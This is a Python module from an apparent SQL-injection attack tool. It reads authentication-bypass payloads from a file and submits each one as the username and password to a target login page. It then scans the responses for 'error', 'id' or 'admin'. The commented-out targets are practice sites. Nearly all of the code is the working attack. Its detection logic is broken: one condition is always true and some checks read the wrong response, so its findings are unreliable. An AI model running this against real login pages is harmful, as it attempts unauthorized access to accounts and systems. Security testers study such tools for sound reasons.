#myenv\Scripts\activate
import os
import sys
import asyncio
import re
import requests
from colorama import Fore,init,Style
from datetime import datetime
import sys
import os
import logging

current_directory = os.getcwd()

sys.path.append(current_directory)


attack_type = "authentication bypass SQL injection"
from lib.scripts.headers import Prepare_the_headers
from lib.scripts.headers import headers
from lib.scripts.headers import header
from  lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from logger.logs import logger
from lib.result.Results import safe_SQLJNG_result
from lib.result.Results import SQLJNG_result_report
from Exceptions.exceptions import SQLJNGStackRangeError
from lib.Stacks.stack import html_response


attack_type = "authentication bypass SQL injection"

"""
Function: mysql_error_based_injection
Description: Performs MySQL error-based basic injection attacks on a target website.

Dependencies:
- os
- sys
- asyncio
- re
- requests
- colorama (Fore, init, Style)
- datetime
- sqlite3
- headers (from headers import *)
- logging

Note:
- The payloads for MySQL error-based attacks are sourced from https://github.com/payloadbox/sql-injection-payload-list.
- The headers for HTTP requests are inspired by https://stackoverflow.com/questions/70017732/how-to-change-the-ip-address-in-the-url.
- The 'headers' module is required for user-agent settings (imported from headers import *).
- Logging is configured to store information in the 'SQLJ.log' file.

Usage:
1. Import the necessary libraries and dependencies.
2. Use the 'mysql_error_based_injection(urls)' function to perform MySQL error-based basic injection attacks on the specified URLs.

Example:
```python
from sql_injection_exploit import mysql_error_based_injection

urls_to_attack = ["http://example.com/login", "http://testsite.net/login"]
for url in urls_to_attack:
    asyncio.run(mysql_error_based_injection(url))
"""





pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}



logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)


async def SQL_inj_BASIC(urls):
    try:
        """This is the main block of our exploit program which sending the payloads. """
        global pattern,htmlpattern  
        done = False 
        filename = "mysqlerrorbased.txt" 
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read()
            rows = payload.split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows) #* 
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
            requests.packages.urllib3.disable_warnings()  #! 
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False) 
            if req.status_code == 200: 
                ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")
                logger.info(f"Host is up:{urls}")

                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"): 
                        params = { 
                            "username": line,
                            "password": line
                        }
                        await Prepare_the_headers()
                        for headerR in headers:
                            ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header}) 
                            logger.info(f"Sending payliad:{line}")
                            await asyncio.sleep(5) 
                            if "error" in ack.text: 
                                logger.info("error parameter might exists in the response code.")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)
                                
                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                            htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                            if vuln: 
                                logger.info("id parameter might exists in the response code")
                                Detect(ack.text)
                                await asyncio.sleep(4)
                                html_response.push(ack.text)
                            
                            if htmlVULN:
                                logger.info("error parameter might exists in the response code")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)
                            
                            word = "id" in req.text                             
                            errword = "error" in req.text
                            if word:
                                logger.info("id parameter might exists in the response code")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)

                            
                            if errword:
                                logger.info("error parameter might exists in the response code")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)


                                
                        if req.status_code == 302:                                             
                            logger.info("Could break to the target.")
                        
                        if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                            logger.info("Admin parameter might exists in the code")
                            Detect(ack.text)
                            html_response.push(ack.text)
                            
                else:
                    logger.error("Host is Down.")
        
    except Exception as e:
        logger.error(e)
        
    except KeyboardInterrupt:
        logger.info("^C Aborted")
        

        
    finally:
        try:
            await SQLJNG_result_report(html_response)
        
        except SQLJNGStackRangeError:
            result = safe_SQLJNG_result(html_response)
            for res in result:
                logger.info(res)
     
        
        
     



# asyncio.run(SQL_inj_BASIC("http://testfire.net/login.jsp"))
